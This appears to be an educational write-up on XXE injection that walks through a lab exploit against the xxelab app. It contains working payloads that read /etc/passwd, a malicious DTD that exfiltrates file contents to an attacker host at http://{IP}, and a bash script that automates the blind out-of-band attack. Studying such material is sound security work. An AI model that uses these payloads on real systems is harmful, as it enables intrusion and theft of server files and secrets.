When we talk about XML External Entity (XXE) Injection, what we are referring to is a security vulnerability in which an attacker can use malicious XML input to access system resources that would not normally be available, such as local files or network services. This vulnerability can be exploited in applications that use XML to process input, such as web applications or web services.

An XXE attack generally involves the injection of a malicious XML entity into an HTTP request, which is processed by the server and can result in the exposure of sensitive information. For example, an attacker could inject an XML entity that references a file on the server system and obtain sensitive information from that file.

A common case where attackers can exploit XXE is when the web server does not properly validate the XML input it receives. In this case, an attacker can inject a malicious XML entity that contains references to system files that the server has access to. This can allow the attacker to obtain sensitive system information, such as passwords, usernames, API keys, among other confidential data.

It should be noted that sometimes XML External Entity (XXE) Injection attacks do not always result in the direct exposure of sensitive information in the server response. In some cases, the attacker must "go in blind" to obtain sensitive information through additional techniques.

A common way to "go blind" in an XXE attack is to send specially crafted requests from the server to connect to an externally defined Document Type Definition (DTD). The DTD is used to validate the structure of an XML file and may contain references to external resources, such as files on the server system.

This "go blind" approach to an XXE attack can be slower and more labor intensive than a direct exploitation of the vulnerability. However, it can be effective in cases where the attacker has a general idea of the resources available on the system and wishes to obtain specific information without being detected.

Additionally, in some cases, an XXE attack can be used as an attack vector to exploit an SSRF (Server-Side Request Forgery) vulnerability. This attack technique can allow an attacker to scan internal ports on a machine that are normally protected by an external firewall.

An SSRF attack involves sending HTTP requests from the server to internal IP addresses or ports on the victim's network. The XXE attack can be used to trigger an SSRF by injecting a malicious XML entity containing a reference to an internal IP address or port into the server's network.

By successfully exploiting an SSRF, the attacker can send HTTP requests to internal services that would otherwise be unavailable to the external network. This can allow the attacker to obtain sensitive information or even take control of internal services.

# Example

----
> The source to test the example below can be found here: [xxelab](https://github.com/jbarone/xxelab).
----

In this example we are going to check with **BurpSuite** the HTTP request sent when I clicked the 'Create Account' button. The request contains the following data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<root>
		<name>
			Loki
		</name>
		<tel>
			333333333
		</tel>
		<email>
			loki@gmail.com
		</email>
		<password>
			loki123
		</password>
	</root>
```

And the response says `Sorry, loki@gmail.com is already registered!`. As we can see, it shows us the email that we entered earlier, so we can try to leak information trough this.

We can create the following XML entity like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
	<root>
		<name>
			Loki
		</name>
		<tel>
			333333333
		</tel>
		<email>
			<!-- We call the entity here to show the data requested in the DTD -->
			&myFile;
		</email>
		<password>
			loki123
		</password>
	</root>
```

Sometimes, the wrapper 'file://' is hard to compile, to make this much better we can convert it to **base64** and then, decode it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
	<root>
		<name>
			Loki
		</name>
		<tel>
			333333333
		</tel>
		<email>
			<!-- We call the entity here to show the data requested in the DTD -->
			&myFile;
		</email>
		<password>
			loki123
		</password>
	</root>
```

Maybe the webpage does not allow us to process entities. In this case we should try **XXE OOB Blind**. This time we will run a local server en Python, where we will receive the server response, we will create a new local .dtd file and we will acess to it like in webpage DTD:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{IP}/malicious.dtd"> %xxe;]>
```

The 'malicious.dtd' file will contain the following:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!-- In this case we will get the /etc/passwd file encoded in base64 -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{IP}/?file=%file;'>">
%eval;
%exfil;
```

We can also automate this via script:

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://{IP}/?file=%file;'>\">
%eval;
%exfil;
"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{IP}/malicious.dtd"> %xxe;]>
<root><name>Loki</name><tel>333333333</tel><email>loki@gmail.com;</email><password>111222333</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```